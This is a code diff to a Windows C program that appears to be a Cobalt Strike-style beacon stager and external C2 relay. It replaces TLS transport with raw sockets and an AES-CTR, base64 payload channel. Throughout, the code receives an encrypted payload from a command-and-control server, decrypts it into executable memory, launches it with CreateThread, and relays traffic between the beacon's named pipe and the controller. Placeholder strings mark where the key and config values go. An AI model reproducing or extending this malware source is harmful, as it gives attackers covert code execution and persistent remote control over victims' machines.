@@ -12,14 +12,12 @@
 #include <ws2tcpip.h>
 #include <stdio.h> 
 #include <stdlib.h>
-#include <wolfssl/options.h>
-#include <wolfssl/wolfcrypt/settings.h>
-//#include <wolfssl/wolfcrypt/aes.h>
-#include <wolfssl/ssl.h>
-#include <wolfssl/wolfio.h>
 
-#define WOLFSSL_USER_IO
+#include "../resources/aes.h"
+#include "../resources/base64.h"
 
+#define CTR 1
+#define IV_MAX_SIZE 16
 // Mudge used these values in his example
 #define PAYLOAD_MAX_SIZE 512 * 1024
 #define BUFFER_MAX_SIZE 1024 * 1024
@@ -35,150 +33,6 @@
 #define debug_print(fmt, ...) \
             do { if (_DEBUG) fprintf(stderr, fmt, __VA_ARGS__); } while (0)
 
-
-/**
- * Encrypt with AES CBC 256bit
- * 
- * @param aes pointer to the AES structure to modify
- * @param key secret key to encrypt/decrypt
- * @param key_size length of key
- * @param buffer input buffer to encrypt
- * @param len length of input buffer
- * @param iv_pad_ciphertxt output buffer containing IV, PAD, then encrypted cipher text
- * @return Error code, 0 on success, -1 on failure
-*/
-/*
-int AesEncrypt(Aes* aes, byte* key, int key_size, char* buffer, int len, char* iv_pad_ciphertxt)
-{
-	byte iv[AES_BLOCK_SIZE];
-	WC_RNG rng;
-	int length = len;
-	int padCounter = 0;
-	int ret = 0;
-	int i = 0;
-
-	// pads the length until it evenly matches a block / increases pad number
-    while (length % AES_BLOCK_SIZE != 0) {
-        length++;
-        padCounter++;
-    }
-
-	char* cleartxt = malloc(length);
-	char* ciphertxt = malloc(length);
-
-	ret = wc_InitRng(&rng);
-	if (ret != 0)
-	{
-		debug_print("%s", "Failed to initialize random number generator\n");
-		return -1;
-	}
-
-	memcpy(cleartxt, buffer, len);
-
-	for (i = len; i < length; i++)
-	{
-		// Pads the added characters with the number of pads
-		cleartxt[i] = padCounter;
-	}
-
-	// Generate IV
-	ret = wc_RNG_GenerateBlock(&rng, iv, AES_BLOCK_SIZE);
-	if (ret != 0)
-	{
-		debug_print("%s", "Failed to generate rng block\n");
-		return -1;
-	}
-
-	// Set key
-	ret = wc_AesSetKey(aes, key, AES_BLOCK_SIZE, iv, AES_ENCRYPTION);
-	if (ret != 0)
-	{
-		debug_print("%s", "Failed to set aes key\n");
-		return -1;
-	}
-
-	// Encrypt message
-	ret = wc_AesCbcEncrypt(aes, ciphertxt, cleartxt, length);
-	if (ret != 0)
-	{
-		debug_print("%s", "Failed to encrypt message\n");
-		return -1;
-	}
-
-	// Need to free this elsewhere
-	iv_pad_ciphertxt = malloc(AES_BLOCK_SIZE + sizeof(padCounter) + length);
-	memcpy(iv_pad_ciphertxt, iv, AES_BLOCK_SIZE);
-	memcpy(iv_pad_ciphertxt, padCounter, sizeof(padCounter));
-	memcpy(iv_pad_ciphertxt, ciphertxt, length);
-
-	wc_FreeRng(&rng);
-	free(ciphertxt);
-	free(cleartxt);
-
-	return ret;
-}
-*/
-
-/**
- * Decrypt with AES CBC 256bit
- * 
- * @param aes pointer to the AES structure to modify
- * @param key secret key to encrypt/decrypt
- * @param key_size length of key
- * @param buffer input buffer to decrypt [IV|PAD|CIPHERTXT]
- * @param len length of input buffer
- * @param cleartxt output buffer containing decrypted message
- * @return Error code, 0 on success, -1 on failure
-*/
-/*
-int AesDecrypt(Aes* aes, byte* key, int key_size, char* buffer, int len, char* cleartxt)
-{
-	byte iv[AES_BLOCK_SIZE];
-	int ret = 0;
-	int i = 0;
-	// length of just ciphertxt
-	int length = len-AES_BLOCK_SIZE;
-	
-	char* ciphertxt = malloc(length);
-	char* cleartxt_padded = malloc(length);
-
-	for (i = 0; i < AES_BLOCK_SIZE; i++)
-	{
-		// Find iv from input buffer
-		iv[i] = buffer[i];
-	}
-
-	// Set key
-	ret = wc_AesSetKey(aes, key, AES_BLOCK_SIZE, iv, AES_DECRYPTION);
-	if (ret != 0)
-	{
-		debug_print("%s", "Failed to set decrypt key\n");
-		return -1;
-	}
-
-	// Copy just cipher text, free this elsewhere
-	memcpy(ciphertxt, buffer+AES_BLOCK_SIZE, length);
-	
-	// Decrypt message
-	ret = wc_AesCbcDecrypt(aes, cleartxt, ciphertxt, length);
-	if (ret != 0)
-	{
-		debug_print("%s", "Failed to decrypt message\n");
-		return -1;
-	}
-
-	if (buffer[AES_BLOCK_SIZE] != 0)
-	{
-		length -= ciphertxt[length-1];
-	}
-	cleartxt = malloc(length);
-	memcpy(cleartxt, cleartxt_padded, length);
-
-	free(ciphertxt);
-	free(cleartxt_padded);
-	return ret;
-}
-*/
 
 /**
  * Creates a socket connection in Windows
@@ -261,25 +115,23 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
 /**
  * Sends data to server received from our injected beacon
  *
- * @param ssl A pointer to the ssl session
+ * @param sd A socket file descriptor
  * @param data A pointer to an array containing data to send
  * @param len Length of data to send
  * @return Number of bytes sent
 */
-int sendData(WOLFSSL* ssl, const char* data, DWORD len) {
+int sendData(SOCKET sd, const char* data, DWORD len) {
 	int iResult;
-	iResult = wolfSSL_write(ssl, (char *)&len, 4);
+	iResult = send(sd, (char *)&len, 4, 0);
 	if (iResult == SOCKET_ERROR)
 	{
 		debug_print("Send failed: %d\n", WSAGetLastError());
-		debug_print("SSL Send failed: %d\n", wolfSSL_get_error(ssl, 0));
 		return -1;
 	}
-	iResult = wolfSSL_write(ssl, data, len);
+	iResult = send(sd, data, len, 0);
 	if (iResult == SOCKET_ERROR)
 	{
 		debug_print("Send failed: %d\n", WSAGetLastError());
-		debug_print("SSL Send failed: %d\n", wolfSSL_get_error(ssl, 0));
 		return -1;
 	}
 	else if (iResult != len)
@@ -293,31 +145,29 @@ int sendData(WOLFSSL* ssl, const char* data, DWORD len) {
 /**
  * Receives data from our C2 controller to be relayed to the injected beacon
  *
- * @param ssl A pointer to the ssl session
+ * @param sd A socket file descriptor
  * @param buffer Buffer to store data in
  * @param len Length of data to send
  * @return Size of data recieved
 */
-DWORD recvData(WOLFSSL* ssl, char * buffer, DWORD max) {
+DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
 	DWORD size = 0, total = 0, temp = 0;
 	int iResult;
 
 	/* read the 4-byte length */
-	iResult = wolfSSL_read(ssl, (char *)&size, 4);
+	iResult = recv(sd, (char *)&size, 4, 0);
 	if (iResult == 0)
 	{
 		debug_print("Recv failed: %d\n", WSAGetLastError());
-		debug_print("SSL Recv failed: %d\n", wolfSSL_get_error(ssl, 0));
 		return -1;
 	}
 
 	/* read in the result */
 	while (total < size) {
-		temp = wolfSSL_read(ssl, buffer + total, size - total);
+		temp = recv(sd, buffer + total, size - total, 0);
 		if (temp == 0)
 		{
 			debug_print("Recv failed: %d\n", WSAGetLastError());
-			debug_print("SSL Recv failed: %d\n", wolfSSL_get_error(ssl, 0));
 			return -1;
 		}
 		total += temp;
@@ -372,14 +222,14 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
  * Main function. Connects to server over TCP, gets beacon and spawns it, then enters send/recv loop
  *
  */
-void main(int argc, char* argv[])
+int main(int argc, char* argv[])
 {
 	// Set connection info
 	if (argc != 1)
 	{
 		debug_print("Incorrect number of args: %d\n", argc);
 		debug_print("Incorrect number of args: %s\n", argv[0]);
-		exit(1);
+		return 0;
 	}
 
 	// Disable crash messages
@@ -403,44 +253,8 @@ void main(int argc, char* argv[])
 	//TIMEOUT_SEC = atoi(argv[5])*1000;
 	TIMEOUT_SEC = atoi("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")*1000;
 
-	//char key[32] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-	//Aes aes;
-	char pem[] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\
-					FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-
-	WOLFSSL_CTX* ctx;
-	WOLFSSL* ssl;
-	WOLFSSL_METHOD* method;
+	char key[100] = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"\
+					"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
@@ -453,60 +267,87 @@ void main(int argc, char* argv[])
 	if (sockfd == INVALID_SOCKET)
 	{
 		debug_print("%s", "Socket creation error!\n");
-		exit(1);
+		return 0;
 	}
-
-	// Initialize ssl library
-	wolfSSL_Init();
-	// Use TLS 1.2
-	method = wolfTLSv1_2_client_method();
-	// Make new ssl context
-	if ( (ctx = wolfSSL_CTX_new(method)) == NULL)
-	{
-		debug_print("%s", "SSL CTX new error\n");
-		exit(1);
-	}
-	// Make new ssl struct
-	if ( (ssl = wolfSSL_new(ctx)) == NULL)
-	{
-		debug_print("%s", "SSL new error\n");
-		exit(1);
-	}
-	// Add cert to ctx
-	int ret = wolfSSL_CTX_load_verify_buffer(ctx, pem, sizeof(pem), SSL_FILETYPE_PEM);
-	if (ret != SSL_SUCCESS)
-	{
-		debug_print("%s", "Pem load failed\n");
-		if (ret == SSL_BAD_FILETYPE)
-		{
-			debug_print("%s", "Bad filetype\n");
-		}
-		if (ret == SSL_BAD_FILE)
-		{
-			debug_print("%s", "Bad file\n");
-		}
-		debug_print("%s", ret);
-		exit(1);
-	}
-	// Connect wolfssl to socket
-	wolfSSL_set_fd(ssl, sockfd);
-	wolfSSL_connect(ssl);
 
 	// Recv beacon payload
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
 		debug_print("%s", "payload buffer malloc failed!\n");
-		exit(1);
+		return 0;
 	}
-	DWORD payload_size = recvData(ssl, payload, PAYLOAD_MAX_SIZE);
-	if (payload_size < 0)
+
+	char * iv = (char *)calloc(IV_MAX_SIZE, sizeof(char));
+	if (iv == NULL)
+	{
+		debug_print("%s", "iv malloc failed!\n");
+		closesocket(sockfd);
+		free(payload);
+		return 0;
+	}
+	char * ct = (char *)calloc(BUFFER_MAX_SIZE, sizeof(char));
+	if (ct == NULL)
+	{
+		debug_print("%s", "ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(payload);
+		return 0;
+	}
+	char * b64iv = (char *)calloc(IV_MAX_SIZE*2, sizeof(char));
+	if (b64iv == NULL)
+	{
+		debug_print("%s", "b64ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(payload);
+		return 0;
+	}
+	char * b64ct = (char *)calloc(BUFFER_MAX_SIZE, sizeof(char));
+	if (b64ct == NULL)
+	{
+		debug_print("%s", "b64ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(b64iv);
+		free(payload);
+		return 0;
+	}
+
+	DWORD iv_size = recvData(sockfd, b64iv, IV_MAX_SIZE);
+	DWORD ct_size = recvData(sockfd, b64ct, PAYLOAD_MAX_SIZE);
+	if (ct_size < 0 || iv_size < 0)
 	{
 		debug_print("%s", "recvData error, exiting\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(b64iv);
+		free(b64ct);
 		free(payload);
-		exit(1);
+		return 0;
 	}
-	debug_print("Recv %d byte payload from TS\n", payload_size);
+
+	iv_size = Base64decode(iv, b64iv);
+	ct_size = Base64decode(ct, b64ct);
+
+	// Decrypt payload
+	struct AES_ctx ctx;
+	//AES_init_ctx(&ctx, key);
+	AES_init_ctx_iv(&ctx, (uint8_t *) key, (uint8_t *) iv);
+	AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) ct, ct_size);
+
+	memcpy(payload, ct, ct_size);
+
+	free(iv);
+	free(ct);
+	free(b64iv);
+	free(b64ct);
+
+	debug_print("Recv %d byte payload from TS\n", ct_size);
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 	// Loop unstil the pipe is up and ready to use
@@ -528,7 +369,7 @@ void main(int argc, char* argv[])
 	{
 		debug_print("%s", "buffer malloc failed!\n");
 		free(payload);
-		exit(1);
+		return 0;
 	}
 
 	while (1) {
@@ -547,31 +388,22 @@ void main(int argc, char* argv[])
 			Sleep(sleep*1000);
 			/*
 			// Close TCP connection, sleep, open new TCP connection
-			wolfSSL_free(ssl);
 			closesocket(sockfd);
 			sockfd = INVALID_SOCKET;
-
 			Sleep(sleep*1000);
-
 			sockfd = create_socket(IP, PORT, TIMEOUT_SEC);
 			if (sockfd == INVALID_SOCKET)
 			{
 				debug_print("%s", "Socket creation error!\n");
 				free(payload);
 				free(buffer);
-				wolfSSL_free(ssl);
-				wolfSSL_CTX_free(ctx);
-				wolfSSL_Cleanup();
 				CloseHandle(beaconPipe);
-				exit(1);
+				return 0;
 			}
-			// Connect wolfssl to socket
-			wolfSSL_set_fd(ssl, sockfd);
-			wolfSSL_connect(ssl);
 			*/
 		}
 
-		int send_size = sendData(ssl, buffer, read_size);
+		int send_size = sendData(sockfd, buffer, read_size);
 		if (send_size < 0)
 		{
 			debug_print("%s", "sendData error, exiting\n");
@@ -579,7 +411,7 @@ void main(int argc, char* argv[])
 		}
 		debug_print("%s", "Sent to TS\n");
 		
-		read_size = recvData(ssl, buffer, BUFFER_MAX_SIZE);
+		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
 		if (read_size <= 0)
 		{
 			debug_print("%s", "recvData error, exiting\n");
@@ -592,12 +424,9 @@ void main(int argc, char* argv[])
 	}
 	free(payload);
 	free(buffer);
-	wolfSSL_free(ssl);
-	wolfSSL_CTX_free(ctx);
-	wolfSSL_Cleanup();
 	closesocket(sockfd);
 	CloseHandle(beaconPipe);
 
-	exit(0);
+	return 0;
 }
 
